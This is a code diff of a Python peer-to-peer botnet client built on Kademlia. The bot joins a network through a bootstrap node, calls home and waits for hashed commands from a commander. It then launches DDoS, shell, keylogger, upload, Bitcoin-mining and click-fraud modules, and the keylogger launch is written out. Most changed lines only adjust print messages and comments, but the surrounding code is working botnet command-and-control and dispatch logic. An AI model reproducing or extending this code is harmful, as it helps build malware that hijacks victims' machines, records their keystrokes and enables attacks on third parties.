@@ -13,7 +13,7 @@ formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(messag
 handler.setFormatter(formatter)
 log = logging.getLogger('kademlia')
 log.addHandler(handler)
-#log.setLevel(logging.WARN) #DEBUG
+#log.setLevel(logging.DEBUG) #DEBUG
 
 
 if len(sys.argv) != 4:
@@ -47,6 +47,7 @@ class botnode:
         self.cmdcnt = 0
         # this will store all the child processes that are started
         self.pgroup = []
+        #This should be populated from a seperate file then encrytped
         self.cmdsrun = {'DDOS': False, 'SHELL': False, 'DOWNLOAD': False,
                         'KEYLOG': False, 'UPLOAD': False, 'BITCOIN': False,
                         'CLICKFRAUD': False, 'HELLO':False}
@@ -63,16 +64,26 @@ async def get_cmd(value, server, bot):
     #The bot needs to check the recived command ID (hashed) from the commander, then sets its value to true and performs the works
     hashcmds = [get_hash(command) for command in bot.cmdsrun.keys()]
     #print("\nTrying to find {} in {}\n".format(value,hashcmds))
+    """
+    def run_cmd(cmd):
+        decrypt(cmd)
+        if bot.cmdsrun[cmd] is False:
+            
+            tmp = 'python {} {}'.format(cmd)
+    """
     try:
         
         args = value.split()
-        cnt = len(args)  # parse out the command count
+        cnt = len(args) # parse out the command count
         #cnt=len(args)
         cmd = args[0]
         print("\nRUNNING CMD: {}\nCMD CNT: {}\nTotal CMDS:{}".format(cmd,cnt,bot.cmdcnt))
-  
+
+        #This should automatically populate the commands to check 
+        #for c in hashcmds: 
         if cmd in hashcmds and cnt > bot.cmdcnt:
             bot.cmdcnt += 1
+            #run_cmd(cmd)
             if cmd == get_hash('KEYLOG'):
                 if bot.cmdsrun['KEYLOG'] is False:
                     tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
@@ -104,12 +115,12 @@ async def get_cmd(value, server, bot):
                 process = subprocess.Popen(tmp.split(), shell=False)
             if cmd == get_hash('HELLO'):
                 tmp = 'python sayHello.py {0}'.format(' '.join(args[1:]))
-                print("Starting Hello program on {0}".format(tmp))
+                print("Starting Hello program on {0}".format(tmp))#log.info(msg)
                 process = subprocess.Popen(tmp.split(),shell=False)
     except Exception as e:
         #log.error()
-        print("\nCaught Exception {}".format(e))
-        print("We errored out trying to match command {} {}\n".format(type(cmd),cmd))
+        print("\nCaught Exception {}".format(e)) #log.error(msg)
+        print("We errored out trying to match command {} {}\n".format(type(cmd),cmd)) #log.error()
         pass
     #pdb.set_trace()
     #await wait_cmd(server, bot)
@@ -132,7 +143,7 @@ async def wait_cmd(server, bot):
         #When the command is received get will return True and break out of the loop
         if checkCommands:
             break
-    print("\nFound a command for nodeID {}\n\n".format(checkCommands))
+    print("\nFound a command\nNodeID: {}\n".format(checkCommands))
     await asyncio.sleep(5)
     await get_cmd(checkCommands,server,bot)
     
@@ -152,7 +163,7 @@ async def callhome(server, bot):
         await asyncio.sleep(5)
         await callhome(server,bot)
     else:    
-        print("\nWe have an ack\nNode: {} has joined {}\n\n"
+        print("\nWe have an ack\nNode: {}\nJoined: {}\n"
         .format(nodeId,NETKEY))
         await wait_cmd(server,bot)
 
@@ -171,7 +182,7 @@ async def setup(server):
     #Create botnode with Its IP, Port, Bot ID, and command hash
     bot = botnode(myip, myport, str(server.node.long_id), cmdhash)
 
-    print("\nParams: NETWORK_KEY {}\nIP: {}\nNODE_ID: {}\nCOMMAND KEY: {}"
+    print("\nParams: NETWORK_KEY: {}\nIP: {}\nNODE_ID: {}\nCOMMAND KEY: {}"
         .format(NETKEY, myip, server.node.long_id, cmdhash))
     #print("\nBOT CREATED?: CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
     #pdb.set_trace()
@@ -185,7 +196,7 @@ async def bootstrapDone(server):
         loop.run_until_complete(server.bootstrap([(bootstrap_ip, bootstrap_port)]))
         server.stop()
         loop.close()
-        print("\nKey is: ",result, "\n\nBootstrapper down: machine has not joined network\n")
+        print("\nKey is: ",result, "\nBootstrapper down: machine has not joined network\n")
     print("\nAble to fetch key as result:",result, type(result))
     return result
     
@@ -205,14 +216,24 @@ loop.set_debug(True)
 server = Server()
 loop.run_until_complete(server.listen(myport))
 loop.run_until_complete(server.bootstrap([(bootstrap_ip, bootstrap_port)]))
-#loop.run_until_complete(bootstrapDone(server, key))
-#pdb.set_trace()
+
 try:
-    #asyncio.ensure_future(bootstrapDone(server)) ## Getting some errors here, need to troubleshoot, but this is just a check to see if we on network. Callhome kinda does similar thing so might not be needed
+    """
+    check if server is not bootstrapped:
+        setup(server)
+    otherwise:
+        run forever = schedule a task to to check if command new command is available      
+    """
+    # if await bootStrapDone(server):
     asyncio.ensure_future(setup(server))
+    #fi 
+    #asyncio.ensure_future(wait_cmd())
     loop.run_forever()
 except KeyboardInterrupt:
     pass
 finally:
     server.stop()
     loop.close()
+    
+#pdb.set_trace()
+#asyncio.ensure_future(bootstrapDone(server)) ## Getting some errors here, need to troubleshoot, but this is just a check to see if we on network. Callhome kinda does similar thing so might not be needed
